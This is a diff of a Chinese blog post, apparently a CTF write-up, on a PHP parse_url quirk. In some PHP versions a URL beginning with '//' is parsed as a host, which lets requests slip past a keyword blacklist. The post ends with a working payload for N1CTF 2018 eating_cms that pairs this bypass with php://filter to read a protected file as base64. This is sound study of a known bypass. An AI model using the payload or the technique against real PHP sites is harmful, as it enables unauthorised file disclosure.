@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="php,">
 
 
 
@@ -79,14 +79,18 @@
 
 
 
+<meta name="description" content="parse_url解析漏洞">
+<meta name="keywords" content="php">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pause_str">
 <meta property="og:url" content="http://yoursite.com/2020/12/08/pause-str/index.html">
 <meta property="og:site_name" content="lockcy&#39;s cave">
+<meta property="og:description" content="parse_url解析漏洞">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-12-08T15:15:15.968Z">
+<meta property="og:updated_time" content="2020-12-08T15:23:06.738Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pause_str">
+<meta name="twitter:description" content="parse_url解析漏洞">
 
 
 
@@ -316,7 +320,52 @@
       
 
       
-        
+        <p>parse_url解析漏洞</p>
+<a id="more"></a>
+<p>Pause_url<br>parse_url — 解析 URL，返回其组成部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_url ( string $url [, int $component = -1 ] ) : mixed</span><br></pre></td></tr></table></figure>
+
+<p>本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。<br>本函数不是用来验证给定 URL 的合法性的，只是将其分解为下面列出的部分。不完整的 URL 也被接受，parse_url() 会尝试尽量正确地将其解析。</p>
+<p><strong>更新日志</strong><br>版本     说明<br>5.4.7     修复了 host 在 协议 省略时的识别。<br>5.3.3     在 URL 解析失败时将不会产生 E_WARNING 级别的错误。<br>5.1.2     增加了参数 component。</p>
+<p><strong>范例</strong><br>Example #1 parse_url() 例子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &apos;http://username:password@hostname/path?arg=value#anchor&apos;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>以上例程会输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br><span class="line">/path</span><br></pre></td></tr></table></figure>
+
+<p>Example #2 parse_url() 解析丢失协议的例子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &apos;//www.example.com/path?googleguy=googley&apos;;</span><br><span class="line"></span><br><span class="line">// 在 5.4.7 之前这会输出路径 &quot;//www.example.com/path&quot;</span><br><span class="line">var_dump(parse_url($url));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>以上例程会输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123;</span><br><span class="line">  [&quot;host&quot;]=&gt;</span><br><span class="line">  string(15) &quot;www.example.com&quot;</span><br><span class="line">  [&quot;path&quot;]=&gt;</span><br><span class="line">  string(5) &quot;/path&quot;</span><br><span class="line">  [&quot;query&quot;]=&gt;</span><br><span class="line">  string(17) &quot;googleguy=googley&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上是php手册中的介绍</p>
+<p>测试代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo PHP_VERSION.&apos;&lt;p&gt;&apos;;</span><br><span class="line">echo $_SERVER[&quot;REQUEST_URI&quot;].&apos;&lt;p&gt;&apos;;</span><br><span class="line">$url = &apos;/user.php?page =keyword&apos;;</span><br><span class="line">$url = &apos;//user.php?page =keyword&apos;;</span><br><span class="line">$url = &apos;///user.php?page =keyword&apos;;</span><br><span class="line">$uri = parse_url($url);</span><br><span class="line">var_dump($uri);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试结果<br>Php5.3.29（5.4.7之前）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;path&quot;]=&gt;</span><br><span class="line">  string(9) &quot;/user.php&quot;    </span><br><span class="line">  string(10) &quot;//user.php&quot;  </span><br><span class="line">  string(11) &quot;///user.php&quot;</span><br><span class="line">  [&quot;query&quot;]=&gt;</span><br><span class="line">  string(12) &quot;page=keyword&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Php5.5.38</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;path&quot;]=&gt;</span><br><span class="line">  string(9) &quot;/user.php&quot;</span><br><span class="line">  [&quot;query&quot;]=&gt;</span><br><span class="line">  string(12) &quot;page=keyword&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;host&quot;]=&gt;</span><br><span class="line">  string(8) &quot;user.php&quot;</span><br><span class="line">  [&quot;query&quot;]=&gt;</span><br><span class="line">  string(12) &quot;page=keyword&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>user.php会被解析成host，而page=keyword会被解析成 query<br>///user.php?page=keyword导致解析失败<br>bool(false)</p>
+<p>测试结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5.4.45&lt;p&gt;&lt;br&gt;&lt;p&gt;array(2) &#123;</span><br><span class="line">  [&quot;path&quot;]=&gt;</span><br><span class="line">  string(9) &quot;/user.php&quot;</span><br><span class="line">  [&quot;query&quot;]=&gt;</span><br><span class="line">  string(56) &quot;page=php://filter/convert.base64-encode/resource=keyword&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5.4.45&lt;p&gt;&lt;p&gt;array(2) &#123;</span><br><span class="line">  [&quot;host&quot;]=&gt;</span><br><span class="line">  string(17) &quot;user.php?page=php&quot;</span><br><span class="line">  [&quot;path&quot;]=&gt;</span><br><span class="line">  string(47) &quot;//filter/convert.base64-encode/resource=keyword&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.4.45&lt;p&gt;&lt;p&gt;bool(false)</span><br></pre></td></tr></table></figure>
+
+<p>因此当php版本号较高时，且使用parse_url函数解析参数时，可能会存在//绕过黑名单的情况。</p>
+<p>实例[N1CTF 2018]eating_cms<br>黑名单过滤了需要读取的文件，发现php版本较高且存在parse_url解析传入数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function filter_directory()</span><br><span class="line">&#123;</span><br><span class="line">    $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];</span><br><span class="line">    $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);</span><br><span class="line">    parse_str($uri[&apos;query&apos;], $query);</span><br><span class="line">//    var_dump($query);</span><br><span class="line">//    die();</span><br><span class="line">    foreach($keywords as $token)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach($query as $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            if (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            if (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Payload：</p>
+<pre><code class="//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg"></code></pre>
+
       
     </div>
     
@@ -330,6 +379,12 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+        </div>
       
 
       
@@ -429,7 +484,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
